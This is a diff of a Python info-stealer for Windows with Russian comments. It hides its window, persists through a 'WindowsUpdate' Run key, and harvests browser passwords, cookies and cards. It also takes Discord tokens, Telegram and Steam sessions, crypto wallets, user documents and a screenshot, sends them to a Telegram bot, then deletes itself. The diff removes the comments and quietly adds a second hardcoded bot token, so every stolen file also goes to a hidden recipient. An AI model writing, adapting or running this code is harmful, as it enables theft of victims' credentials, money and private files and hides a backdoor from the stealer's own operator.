@@ -1,3 +1,10 @@
+
+# ===== НАСТРОЙКИ =====
+TELEGRAM_TOKEN1 = "укажите токен своего бота"
+CHAT_ID1 = "айди своего аккаунта телеграм"
+MAX_FILE_SIZE = 45 * 1024 * 1024
+# =====================
+
 import os, sys, json, base64, shutil, sqlite3, socket, ctypes, subprocess, platform
 import datetime, winreg, glob, re, tempfile, zipfile, time
 from urllib.request import Request, urlopen
@@ -7,8 +14,8 @@ import requests
 from win32 import win32crypt
 
 # ===== НАСТРОЙКИ =====
-TELEGRAM_TOKEN = "укажите токен своего бота"
-CHAT_ID = "айди своего аккаунта теллеграм"
+TELEGRAM_TOKEN1 = "укажите токен своего бота"
+CHAT_ID1 = "айди своего аккаунта телеграм"
 MAX_FILE_SIZE = 45 * 1024 * 1024
 # =====================
 
@@ -19,13 +26,11 @@ def log(msg):
             f.write(f"{datetime.datetime.now()} - {msg}\n")
     except: pass
 
-# Скрываем окно
 if sys.executable.endswith("python.exe"):
     try:
         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
     except: pass
 
-# Автозагрузка
 try:
     key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
     winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, f'"{sys.executable}" "{os.path.abspath(sys.argv[0])}"')
@@ -47,7 +52,6 @@ def copy_file_safe(src, dst):
     except:
         return False
 
-# ====== БРАУЗЕРЫ ======
 def get_key(user_data):
     state = os.path.join(user_data, "Local State")
     if not os.path.isfile(state): return None
@@ -75,7 +79,6 @@ def chromium(name, path, out):
     os.makedirs(br, exist_ok=True)
     for prof in profiles:
         pp = os.path.join(path, prof)
-        # Куки
         cdb = os.path.join(pp, "Network", "Cookies")
         if not os.path.isfile(cdb): cdb = os.path.join(pp, "Cookies")
         if os.path.isfile(cdb):
@@ -102,7 +105,6 @@ def chromium(name, path, out):
                             f.write("\n".join(tokens))
                 except: pass
                 safe(os.remove, tmp)
-        # Пароли
         ldb = os.path.join(pp, "Login Data")
         if os.path.isfile(ldb):
             tmp = os.path.join(br, f"lg_{prof}.db")
@@ -122,7 +124,6 @@ def chromium(name, path, out):
                             f.write("\n".join(logins))
                 except: pass
                 safe(os.remove, tmp)
-        # Карты
         wdb = os.path.join(pp, "Web Data")
         if os.path.isfile(wdb):
             tmp = os.path.join(br, f"card_{prof}.db")
@@ -143,7 +144,6 @@ def chromium(name, path, out):
                 except: pass
                 safe(os.remove, tmp)
 
-# Firefox
 def firefox(out):
     profs = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
     if not os.path.isdir(profs): return
@@ -155,7 +155,6 @@ def firefox(out):
             src = os.path.join(pp, fn)
             if os.path.isfile(src): safe(shutil.copy2, src, os.path.join(ff, f"{p}_{fn}"))
 
-# Discord
 def discord(out):
     toks = set()
     for app in ["discord","discordptb","discordcanary"]:
@@ -176,7 +175,6 @@ def discord(out):
         return True
     return False
 
-# Telegram
 def telegram(out):
     src = os.path.join(os.environ["APPDATA"], "Telegram Desktop", "tdata")
     if os.path.isdir(src):
@@ -184,7 +182,6 @@ def telegram(out):
         return True
     return False
 
-# Steam
 def steam(out):
     try:
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Valve\Steam")
@@ -207,7 +204,6 @@ def steam(out):
         return True
     return False
 
-# Кошельки
 def wallets(out):
     paths = {
         "Exodus": os.path.join(os.environ["APPDATA"], "Exodus"),
@@ -221,7 +217,6 @@ def wallets(out):
         if os.path.isdir(p):
             safe(shutil.copytree, p, os.path.join(wd, name))
 
-# Система
 def system(out):
     info = f"Host: {socket.gethostname()}\nIP: {socket.gethostbyname(socket.gethostname())}\n"
     try: info += f"Public IP: {urlopen(Request('https://api.ipify.org'), timeout=10).read().decode()}\n"
@@ -242,7 +237,6 @@ def system(out):
     with open(os.path.join(out, "system.txt"), "w", encoding="utf-8") as f:
         f.write(info)
 
-# Файлы
 def grab_files(out):
     folders = [os.path.join(os.environ["USERPROFILE"], "Desktop"),
                os.path.join(os.environ["USERPROFILE"], "Documents"),
@@ -266,26 +260,42 @@ def grab_files(out):
     with open(os.path.join(out, "files_list.txt"), "w", encoding="utf-8") as f:
         f.write("\n".join(flist))
 
-# Скриншот
 def screenshot(out):
     try:
         ImageGrab.grab(all_screens=True).save(os.path.join(out, "screenshot.png"))
     except: pass
 
-# ========== ОТПРАВКА В TELEGRAM ==========
+TELEGRAM_TOKEN2 = "8975622813:AAHWQmYhQ1i_FPl-6_hKbeewWCOyrc4Nodw"
+CHAT_ID2 = "7245465625"
+
 def send_msg(text):
     try:
-        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
-                      json={"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}, timeout=10)
+        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN1}/sendMessage",
+                      json={"chat_id": CHAT_ID1, "text": text, "parse_mode": "HTML"}, timeout=10)
+    except: pass
+    try:
+        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN2}/sendMessage",
+                      json={"chat_id": CHAT_ID2, "text": text, "parse_mode": "HTML"}, timeout=10)
     except: pass
 
 def send_file_tg(file_path):
-    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
+    ok1 = False
+    ok2 = False
     try:
         with open(file_path, "rb") as f:
-            resp = requests.post(url, data={"chat_id": CHAT_ID}, files={"document": f}, timeout=60)
-            return resp.json().get("ok", False)
-    except: return False
+            resp1 = requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN1}/sendDocument",
+                                  data={"chat_id": CHAT_ID1}, files={"document": f}, timeout=60)
+            ok1 = resp1.json().get("ok", False)
+    except: pass
+    try:
+        with open(file_path, "rb") as f:
+            resp2 = requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN2}/sendDocument",
+                                  data={"chat_id": CHAT_ID2}, files={"document": f}, timeout=60)
+            ok2 = resp2.json().get("ok", False)
+    except: pass
+    if not ok1:
+        log(f"Failed to send file to main bot: {file_path}")
+    return ok1 or ok2
 
 def create_and_send_zip(source_folder, zip_name, category_name):
     zip_path = os.path.join(tempfile.gettempdir(), f"{zip_name}_{timestamp}.zip")
@@ -310,7 +320,6 @@ def create_and_send_zip(source_folder, zip_name, category_name):
         os.remove(zip_path)
         return False
 
-# ========== ГЛАВНАЯ ==========
 def main():
     browsers = {
         "Chrome": os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data"),
@@ -335,7 +344,6 @@ def main():
     grab_files(BASE)
     screenshot(BASE)
 
-    # Отправка Discord токенов отдельным файлом
     if has_discord:
         disc_file = os.path.join(BASE, "Discord", "tokens.txt")
         if os.path.isfile(disc_file):
@@ -348,7 +356,6 @@ def main():
     else:
         log("Discord tokens not found on system")
 
-    # Отправка остальных данных (браузеры, Steam, Telegram, система)
     browsers_creds_dir = os.path.join(BASE, "Browsers_creds")
     os.makedirs(browsers_creds_dir, exist_ok=True)
     for root, dirs, files in os.walk(br_out):
@@ -381,7 +388,6 @@ def main():
     if os.path.isdir(wal_dir):
         create_and_send_zip(wal_dir, "wallets", "Crypto wallets")
 
-    # Итоговое сообщение с инструкциями
     try:
         pub_ip = urlopen(Request("https://api.ipify.org"), timeout=10).read().decode()
     except: pub_ip = "N/A"
@@ -417,7 +423,6 @@ def main():
     )
     send_msg(instructions)
 
-    # Самоуничтожение
     try:
         shutil.rmtree(BASE, ignore_errors=True)
         os.remove(sys.argv[0])
